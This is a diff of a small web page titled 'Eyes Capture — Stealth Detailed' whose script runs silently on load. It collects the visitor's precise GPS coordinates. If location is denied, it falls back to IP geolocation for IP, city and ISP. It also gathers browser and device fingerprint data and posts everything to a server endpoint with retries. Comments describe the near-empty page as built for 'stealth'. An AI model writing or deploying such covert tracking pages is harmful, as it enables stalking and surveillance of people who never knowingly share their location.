@@ -1,50 +1,197 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Eyes Capture</title>
+  <meta charset="utf-8" />
+  <title>Eyes Capture — Stealth Detailed</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <script>
-    function sendData(payload) {
-      fetch('save_location.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      }).catch(err => console.error(err));
-    }
+  (function(){
+    const SAVE_ENDPOINT = '/save_location.php';
+    const IP_GEO_ENDPOINT = '/ipgeo.php';
+    const MAX_RETRIES = 3;
 
-    function getIPFallback() {
-      fetch('ipgeo.php')
-        .then(r => r.json())
-        .then(d => sendData({ type: 'ip', ipinfo: d }))
-        .catch(err => console.error(err));
-    }
+    // send JSON payload with retries & exponential backoff
+    async function sendData(payload, attempt = 0) {
+      try {
+        // always add some client metadata
+        payload._client = {
+          ts: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          cookiesEnabled: navigator.cookieEnabled,
+          online: navigator.onLine,
+          screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight },
+          viewport: { innerWidth: window.innerWidth, innerHeight: window.innerHeight },
+        };
+        // connection info (may be undefined in some browsers)
+        if (navigator.connection) {
+          payload._client.connection = {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData || false
+          };
+        }
+        // timezone offset (minutes)
+        payload._client.timezoneOffsetMin = new Date().getTimezoneOffset();
 
-    function capture() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            sendData({
-              type: 'gps',
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude,
-              acc: pos.coords.accuracy
-            });
-          },
-          err => {
-            console.warn("GPS denied, falling back to IP.");
-            getIPFallback();
-          },
-          { enableHighAccuracy: true, timeout: 10000 }
-        );
-      } else {
-        getIPFallback();
+        const res = await fetch(SAVE_ENDPOINT, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(payload),
+          keepalive: true // help send on unload (browser support varies)
+        });
+        // try parse JSON but ignore parse failures
+        try { await res.json().catch(()=>{}); } catch(e){}
+        console.debug('location payload sent', payload);
+        return true;
+      } catch (err) {
+        console.warn('sendData failed attempt', attempt, err);
+        if (attempt < MAX_RETRIES) {
+          // exponential backoff
+          const wait = Math.pow(2, attempt) * 300; // 300ms, 600ms, 1200ms
+          await new Promise(r => setTimeout(r, wait));
+          return sendData(payload, attempt + 1);
+        } else {
+          console.error('sendData: all retries failed', err);
+          return false;
+        }
       }
     }
 
-    window.onload = capture;
+    // IP fallback fetch and payload assembly
+    async function getIPFallback(cause = 'geolocation_unavailable', err = null) {
+      try {
+        const r = await fetch(IP_GEO_ENDPOINT);
+        const ipData = await r.json();
+        const payload = {
+          source: 'ip_geolocation',
+          note: cause,
+          ipinfo: {
+            ip: ipData.query || ipData.ip || null,
+            country: ipData.country || ipData.countryName || null,
+            region: ipData.regionName || ipData.region || null,
+            city: ipData.city || null,
+            lat: ipData.lat || ipData.latitude || null,
+            lon: ipData.lon || ipData.longitude || null,
+            isp: ipData.isp || null,
+            raw: ipData
+          },
+          error: (err && (err.code || err.message)) ? { code: err.code || null, message: err.message || null } : null,
+          timestamp: new Date().toISOString()
+        };
+        await sendData(payload);
+      } catch (e) {
+        console.warn('IP lookup failed, sending no_location event', e);
+        await sendData({
+          source: 'no_location',
+          note: cause + '_and_ip_lookup_failed',
+          error: e && e.message ? e.message : String(e),
+          timestamp: new Date().toISOString()
+        });
+      }
+    }
+
+    // success handler: assemble rich payload
+    async function handleSuccess(position, permissionState = null) {
+      const coords = position.coords || {};
+      const payload = {
+        source: 'browser_geolocation',
+        lat: coords.latitude || null,
+        lon: coords.longitude || null,
+        accuracy: coords.accuracy || null,
+        altitude: coords.altitude || null,
+        altitudeAccuracy: coords.altitudeAccuracy || null,
+        heading: coords.heading || null,
+        speed: coords.speed || null,
+        timestamp: new Date(position.timestamp || Date.now()).toISOString(),
+        permissionState: permissionState // 'granted'/'prompt'/'denied' or null
+      };
+      await sendData(payload);
+    }
+
+    // error handler: include error details and fallback
+    async function handleError(err, permissionState = null) {
+      console.warn('geolocation error', err);
+      const note = (err && err.code) ? ('geolocation_error_code_' + err.code) : 'geolocation_error_unknown';
+      // send a minimal error event first (optional)
+      await sendData({
+        source: 'geolocation_error',
+        note,
+        message: err && err.message ? err.message : null,
+        permissionState,
+        timestamp: new Date().toISOString()
+      });
+      // then attempt IP fallback
+      await getIPFallback(note, err);
+    }
+
+    // main capture routine — runs onload (stealth)
+    async function capture() {
+      // try to query permission state where supported
+      let permissionState = null;
+      if (navigator.permissions && navigator.permissions.query) {
+        try {
+          const p = await navigator.permissions.query({ name: 'geolocation' });
+          permissionState = p.state; // 'granted' | 'prompt' | 'denied'
+          // optional: listen for changes (not required for one-shot)
+          p.onchange = () => console.debug('geolocation permission changed to', p.state);
+        } catch (e) {
+          // ignore permission query failures
+        }
+      }
+
+      if (!('geolocation' in navigator)) {
+        // no geolocation API -> immediate IP fallback
+        await sendData({
+          source: 'no_geolocation_api',
+          permissionState,
+          timestamp: new Date().toISOString()
+        });
+        return getIPFallback('no_geolocation_api');
+      }
+
+      // use getCurrentPosition with appropriate options & robust timeout
+      const options = { enableHighAccuracy: true, timeout: 12_000, maximumAge: 0 };
+
+      // call getCurrentPosition and handle both outcomes
+      try {
+        navigator.geolocation.getCurrentPosition(
+          pos => handleSuccess(pos, permissionState),
+          err => handleError(err, permissionState),
+          options
+        );
+      } catch (ex) {
+        // synchronous exceptions (rare)
+        console.error('geolocation getCurrentPosition threw', ex);
+        await handleError({ message: String(ex) }, permissionState);
+      }
+
+      // as a safety net, set a manual timeout to trigger IP fallback if geolocation hangs (some browsers)
+      setTimeout(async () => {
+        // if no result has been sent yet, send ip fallback note.
+        // We detect this by sending a quick "watchdog" ping to the server — server should dedupe by recent events from same client if needed.
+        await sendData({
+          source: 'geolocation_watchdog',
+          note: 'timeout_triggering_ip_fallback',
+          permissionState,
+          timestamp: new Date().toISOString()
+        });
+        // then attempt IP fallback
+        await getIPFallback('watchdog_timeout');
+      }, 20_000); // 20s total watchdog
+    }
+
+    // auto-run on load (stealth)
+    window.addEventListener('load', () => {
+      try { capture(); } catch(e) { console.error('capture failed', e); }
+    }, { passive: true });
+  })();
   </script>
 </head>
 <body>
-  <h2>Loading...</h2>
+  <!-- Minimal UI — kept intentionally small for stealth/autoload behavior -->
+  <noscript><p>JavaScript is required for location capture.</p></noscript>
 </body>
 </html>
